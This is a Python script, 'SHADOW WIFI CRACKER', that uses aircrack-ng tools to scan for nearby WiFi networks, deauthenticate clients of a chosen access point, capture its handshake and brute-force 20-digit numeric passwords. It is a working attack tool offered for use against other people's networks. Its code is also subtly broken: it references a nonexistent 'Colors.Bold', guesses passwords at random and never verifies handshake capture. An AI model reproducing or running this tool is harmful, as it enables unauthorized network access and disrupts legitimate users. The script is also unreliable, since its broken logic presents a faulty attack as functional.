#!/usr/bin/env python3
"""
SHADOW WIFI CRACKER v1.0
Brute Force WiFi dengan Password Numeric 20 Digit
Support: Linux/Termux dengan Monitor Mode
"""

import os
import sys
import time
import random
import threading
import subprocess
from datetime import datetime

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    banner = f"""
{Colors.RED}{Colors.BOLD}
    ███████ ██   ██  █████  ██████   ██████   ██     ██ ███████ ██ 
    ██      ██   ██ ██   ██ ██   ██ ██    ██ ██     ██ ██      ██ 
    ███████ ███████ ███████ ██   ██ ██    ██ ██  █  ██ █████   ██ 
         ██ ██   ██ ██   ██ ██   ██ ██    ██ ██ ███ ██ ██         
    ███████ ██   ██ ██   ██ ██████   ██████   ███ ███  ███████ ██ 
    
    ██     ██ ███████ ██ ███████ ██  ██████              
    ██     ██ ██      ██ ██      ██ ██    ██             
    ██  █  ██ █████   ██ █████   ██ ██    ██             
    ██ ███ ██ ██      ██ ██      ██ ██    ██             
     ███ ███  ███████ ██ ██      ██  ██████              
{Colors.END}
    {Colors.RED}🚀 SHADOW WIFI CRACKER v1.0{Colors.END}
    {Colors.BLUE}🔥 Brute Force WiFi 20-Digit Numeric Passwords{Colors.END}
    {Colors.YELLOW}⚡ Optimized for Termux & Linux{Colors.END}
    """
    print(banner)

class WiFiCracker:
    def __init__(self, target_ssid):
        self.target_ssid = target_ssid
        self.interface = "wlan0"  # Default interface
        self.is_monitor_mode = False
        self.found_password = None
        self.attempts = 0
        self.start_time = None
        self.stop_flag = False
        
        # Check system capabilities
        self.check_dependencies()
        
    def check_dependencies(self):
        """Check if required tools are installed"""
        required_tools = ['aircrack-ng', 'airodump-ng', 'aireplay-ng']
        missing_tools = []
        
        for tool in required_tools:
            try:
                subprocess.run(['which', tool], capture_output=True, check=True)
            except:
                missing_tools.append(tool)
        
        if missing_tools:
            print(f"{Colors.RED}[-] Missing tools: {', '.join(missing_tools)}{Colors.END}")
            print(f"{Colors.YELLOW}[!] Install with: pkg install aircrack-ng{Colors.END}")
            sys.exit(1)
    
    def enable_monitor_mode(self):
        """Enable monitor mode on wireless interface"""
        print(f"{Colors.BLUE}[*] Enabling monitor mode...{Colors.END}")
        
        try:
            # Kill conflicting processes
            subprocess.run(['airmon-ng', 'check', 'kill'], capture_output=True)
            
            # Start monitor mode
            result = subprocess.run(
                ['airmon-ng', 'start', self.interface], 
                capture_output=True, 
                text=True
            )
            
            if 'monitor mode' in result.stdout.lower():
                self.is_monitor_mode = True
                # Find monitor interface
                for line in result.stdout.split('\n'):
                    if 'monitor' in line and 'wlan' in line:
                        parts = line.split()
                        if parts:
                            self.interface = parts[0]
                            break
                
                print(f"{Colors.GREEN}[+] Monitor mode enabled on {self.interface}{Colors.END}")
                return True
            else:
                print(f"{Colors.RED}[-] Failed to enable monitor mode{Colors.END}")
                return False
                
        except Exception as e:
            print(f"{Colors.RED}[-] Error enabling monitor mode: {e}{Colors.END}")
            return False
    
    def disable_monitor_mode(self):
        """Disable monitor mode"""
        if self.is_monitor_mode:
            print(f"{Colors.BLUE}[*] Disabling monitor mode...{Colors.END}")
            subprocess.run(['airmon-ng', 'stop', self.interface], capture_output=True)
            self.is_monitor_mode = False
            print(f"{Colors.GREEN}[+] Monitor mode disabled{Colors.END}")
    
    def scan_wifi_networks(self):
        """Scan for nearby WiFi networks"""
        print(f"{Colors.BLUE}[*] Scanning for WiFi networks...{Colors.END}")
        print(f"{Colors.YELLOW}[!] Press Ctrl+C to stop scanning{Colors.END}")
        
        networks = []
        try:
            # Run airodump-ng to scan networks
            process = subprocess.Popen(
                ['airodump-ng', self.interface],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Scan for 10 seconds
            time.sleep(10)
            process.terminate()
            output, _ = process.communicate()
            
            # Parse output for networks
            for line in output.split('\n'):
                if 'SSID' in line or len(line) < 10:
                    continue
                    
                parts = line.split()
                if len(parts) >= 13:
                    bssid = parts[0]
                    channel = parts[5]
                    ssid = ' '.join(parts[13:]) if len(parts) > 13 else 'Hidden'
                    
                    if ssid and ssid != 'SSID':
                        networks.append({
                            'bssid': bssid,
                            'channel': channel,
                            'ssid': ssid
                        })
            
            return networks
            
        except Exception as e:
            print(f"{Colors.RED}[-] Scan error: {e}{Colors.END}")
            return []
    
    def generate_numeric_passwords(self, length=20):
        """Generator for numeric passwords"""
        # Start with common numeric patterns
        common_patterns = [
            '1234567890' * 2,  # 12345678901234567890
            '0000000000' * 2,  # 00000000000000000000
            '1111111111' * 2,  # 11111111111111111111
        ]
        
        # Yield common patterns first
        for pattern in common_patterns:
            if len(pattern) == length:
                yield pattern[:length]
        
        # Then generate random numeric combinations
        while not self.stop_flag:
            password = ''.join(random.choice('0123456789') for _ in range(length))
            yield password
    
    def brute_force_attack(self, target_bssid, target_channel):
        """Main brute force attack"""
        print(f"{Colors.RED}[*] Starting brute force attack...{Colors.END}")
        print(f"{Colors.CYAN}Target: {self.target_ssid}{Colors.END}")
        print(f"{Colors.CYAN}BSSID: {target_bssid}{Colors.END}")
        print(f"{Colors.CYAN}Channel: {target_channel}{Colors.END}")
        
        self.start_time = datetime.now()
        password_generator = self.generate_numeric_passwords(20)
        
        # Create capture file
        capture_file = f"/tmp/wifi_capture_{int(time.time())}"
        
        try:
            # Start capturing handshake
            capture_process = subprocess.Popen(
                [
                    'airodump-ng',
                    '--bssid', target_bssid,
                    '--channel', target_channel,
                    '--write', capture_file,
                    self.interface
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Deauth attack to capture handshake
            print(f"{Colors.YELLOW}[*] Sending deauth attacks to capture handshake...{Colors.END}")
            deauth_process = subprocess.Popen(
                [
                    'aireplay-ng',
                    '--deauth', '10',
                    '-a', target_bssid,
                    self.interface
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            time.sleep(15)  # Wait for handshake capture
            
            # Stop deauth
            deauth_process.terminate()
            
            # Start brute force
            for password in password_generator:
                if self.stop_flag:
                    break
                    
                self.attempts += 1
                
                if self.attempts % 100 == 0:
                    elapsed = datetime.now() - self.start_time
                    rate = self.attempts / max(elapsed.total_seconds(), 1)
                    print(f"{Colors.PURPLE}[*] Attempts: {self.attempts} | Rate: {rate:.1f}/sec | Current: {password}{Colors.END}")
                
                # Test password with aircrack-ng
                result = subprocess.run(
                    [
                        'aircrack-ng',
                        '-w', '-',  # Read wordlist from stdin
                        '-b', target_bssid,
                        f'{capture_file}-01.cap'
                    ],
                    input=password + '\n',
                    capture_output=True,
                    text=True
                )
                
                if 'KEY FOUND' in result.stdout:
                    self.found_password = password
                    print(f"\n{Colors.GREEN}{Colors.BOLD}🎉 PASSWORD FOUND!{Colors.END}")
                    print(f"{Colors.GREEN}SSID: {self.target_ssid}{Colors.END}")
                    print(f"{Colors.GREEN}Password: {password}{Colors.END}")
                    print(f"{Colors.GREEN}Attempts: {self.attempts}{Colors.END}")
                    print(f"{Colors.GREEN}Time: {datetime.now() - self.start_time}{Colors.END}")
                    break
                
                # Clear line and show current attempt
                sys.stdout.write(f"\r{Colors.BLUE}[*] Testing: {password}{Colors.END}")
                sys.stdout.flush()
            
            # Cleanup
            capture_process.terminate()
            
        except Exception as e:
            print(f"{Colors.RED}[-] Attack error: {e}{Colors.END}")
        
        finally:
            # Cleanup files
            try:
                for ext in ['.cap', '.csv', '.kismet.csv', '.kismet.netxml']:
                    file_path = f"{capture_file}-01{ext}"
                    if os.path.exists(file_path):
                        os.remove(file_path)
            except:
                pass
    
    def auto_select_target(self):
        """Automatically select target from scan"""
        networks = self.scan_wifi_networks()
        
        if not networks:
            print(f"{Colors.RED}[-] No networks found{Colors.END}")
            return None
        
        print(f"\n{Colors.GREEN}{Colors.BOLD}📶 FOUND NETWORKS:{Colors.END}")
        for i, network in enumerate(networks, 1):
            print(f"{Colors.CYAN}[{i}] {network['ssid']} - {network['bssid']} - Channel {network['channel']}{Colors.END}")
        
        try:
            choice = int(input(f"\n{Colors.WHITE}>>> Select target (1-{len(networks)}): {Colors.END}"))
            if 1 <= choice <= len(networks):
                return networks[choice-1]
        except:
            pass
        
        return None
    
    def run_attack(self):
        """Main attack runner"""
        clear_screen()
        print_banner()
        
        # Enable monitor mode
        if not self.enable_monitor_mode():
            return
        
        try:
            # Get target
            if not self.target_ssid:
                target_info = self.auto_select_target()
                if not target_info:
                    return
                self.target_ssid = target_info['ssid']
            else:
                # Scan to get BSSID and channel for target SSID
                networks = self.scan_wifi_networks()
                target_info = None
                for network in networks:
                    if network['ssid'] == self.target_ssid:
                        target_info = network
                        break
                
                if not target_info:
                    print(f"{Colors.RED}[-] Network '{self.target_ssid}' not found{Colors.END}")
                    return
            
            # Start attack
            print(f"\n{Colors.RED}{Colors.Bold}🚀 STARTING BRUTE FORCE ATTACK{Colors.END}")
            print(f"{Colors.RED}Target SSID: {self.target_ssid}{Colors.END}")
            print(f"{Colors.RED}BSSID: {target_info['bssid']}{Colors.END}")
            print(f"{Colors.RED}Channel: {target_info['channel']}{Colors.END}")
            print(f"{Colors.YELLOW}[!] This may take a while...{Colors.END}")
            print(f"{Colors.YELLOW}[!] Press Ctrl+C to stop{Colors.END}")
            
            input(f"\n{Colors.GREEN}Press Enter to start attack...{Colors.END}")
            
            # Run attack
            self.brute_force_attack(target_info['bssid'], target_info['channel'])
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Attack stopped by user{Colors.END}")
            self.stop_flag = True
        
        finally:
            self.disable_monitor_mode()
            
            if not self.found_password:
                print(f"\n{Colors.RED}[-] Password not found after {self.attempts} attempts{Colors.END}")
            
            # Save results
            self.save_results()

    def save_results(self):
        """Save attack results to file"""
        if self.found_password:
            filename = f"wifi_cracked_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(f"SHADOW WIFI CRACKER RESULTS\n")
                f.write(f"===========================\n")
                f.write(f"SSID: {self.target_ssid}\n")
                f.write(f"Password: {self.found_password}\n")
                f.write(f"Attempts: {self.attempts}\n")
                f.write(f"Time: {datetime.now() - self.start_time}\n")
                f.write(f"Date: {datetime.now()}\n")
            
            print(f"{Colors.GREEN}[+] Results saved to: {filename}{Colors.END}")

def main():
    if os.geteuid() != 0:
        print(f"{Colors.RED}[!] Run as root for monitor mode access!{Colors.END}")
        print(f"{Colors.YELLOW}[!] Use: sudo python3 wifi_cracker.py{Colors.END}")
        sys.exit(1)
    
    if len(sys.argv) > 1:
        target_ssid = sys.argv[1]
    else:
        target_ssid = input(f"{Colors.WHITE}Enter target WiFi SSID (or press Enter to scan): {Colors.END}").strip()
        if not target_ssid:
            target_ssid = None
    
    cracker = WiFiCracker(target_ssid)
    cracker.run_attack()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}Program terminated{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}Fatal error: {e}{Colors.END}")
